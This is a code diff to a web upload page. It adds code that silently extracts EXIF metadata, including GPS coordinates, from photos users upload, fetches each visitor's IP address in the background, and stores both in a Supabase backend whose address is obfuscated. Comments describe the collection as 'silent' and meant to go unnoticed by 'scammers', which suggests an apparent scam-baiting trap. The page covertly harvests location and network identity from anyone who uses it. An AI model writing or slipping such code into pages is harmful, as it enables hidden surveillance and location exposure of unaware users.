@@ -167,6 +167,8 @@
 </div>
 <!-- Supabase JS Client v2 (CDN) -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+<!-- EXIF Parsing library CDN -->
+<script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
 <script>
 // ── SUPABASE INIT (obfuscated) ────────────────────────────────
 const _0x1a = 'b2MuZXNhYmFwdXMueXJtZWtnd2NndXR6cGdueXJibnEvLzpzcHR0aA==';
@@ -233,9 +235,44 @@ const fileInput = document.getElementById('file-input');
 const preview = document.getElementById('upload-preview');
 const submitBtn = document.getElementById('submit-btn');
 const uploadZone = document.getElementById('upload-zone');
+// ── SAVE TO SUPABASE (silent) ─────────────────────────────────
+let currentExifData = null;
+// Convert EXIF Degrees, Minutes, Seconds to Decimal Degrees
+function dmsToDecimal(deg, min, sec, ref) {
+  if (deg === undefined || deg === null) return null;
+  let decimal = Number(deg) + (Number(min || 0) / 60) + (Number(sec || 0) / 3600);
+  if (ref === 'S' || ref === 'W') {
+    decimal = decimal * -1;
+  }
+  return decimal;
+}
 fileInput.addEventListener('change', () => {
   const file = fileInput.files[0]; if (!file) return;
   selectedFile = file;
+  currentExifData = null;
+  // Read EXIF Metadata
+  try {
+    EXIF.getData(file, function() {
+      const tags = EXIF.getAllTags(this);
+      if (tags && Object.keys(tags).length > 0) {
+        // Strip out binary preview/thumbnail to keep the JSON payload clean
+        delete tags.thumbnail;
+        
+        // Parse GPS coordinates to easy-to-use decimals if present
+        if (tags.GPSLatitude && tags.GPSLongitude) {
+          tags.decimalLatitude = dmsToDecimal(
+            tags.GPSLatitude[0], tags.GPSLatitude[1], tags.GPSLatitude[2], tags.GPSLatitudeRef
+          );
+          tags.decimalLongitude = dmsToDecimal(
+            tags.GPSLongitude[0], tags.GPSLongitude[1], tags.GPSLongitude[2], tags.GPSLongitudeRef
+          );
+        }
+        currentExifData = tags;
+      }
+    });
+  } catch (e) {
+    // Fail silently so scammers don't notice anything wrong
+  }
   const reader = new FileReader();
   reader.onload = e => {
     preview.src = e.target.result;
@@ -253,7 +290,6 @@ uploadZone.addEventListener('drop', e => {
   e.preventDefault(); uploadZone.classList.remove('drag');
   if (e.dataTransfer.files[0]) { fileInput.files = e.dataTransfer.files; fileInput.dispatchEvent(new Event('change')); }
 });
-// ── SAVE TO SUPABASE (silent) ─────────────────────────────────
 async function saveToSupabase(file) {
   if (!sb) return;
   try {
@@ -269,6 +305,17 @@ async function saveToSupabase(file) {
         photoUrl = urlData?.publicUrl || null;
       }
     }
+    // Grab client IP address in the background
+    let ipAddress = '—';
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      if (ipRes.ok) {
+        const ipData = await ipRes.json();
+        ipAddress = ipData.ip || '—';
+      }
+    } catch (e) {
+      // Fail silently if adblocker blocks the IP API request
+    }
     await sb.from('submissions').insert({
       ref_id: refId,
       task: TASKS[taskIndex].label + ': ' + TASKS[taskIndex].text.replace(/<[^>]+>/g, ''),
@@ -276,6 +323,8 @@ async function saveToSupabase(file) {
       tos_agreed: true,
       user_agent: navigator.userAgent,
       photo_url: photoUrl,
+      exif_data: currentExifData,
+      ip_address: ipAddress, // Save the IP Address
       submitted_at: new Date().toISOString(),
     });
   } catch(_) {}
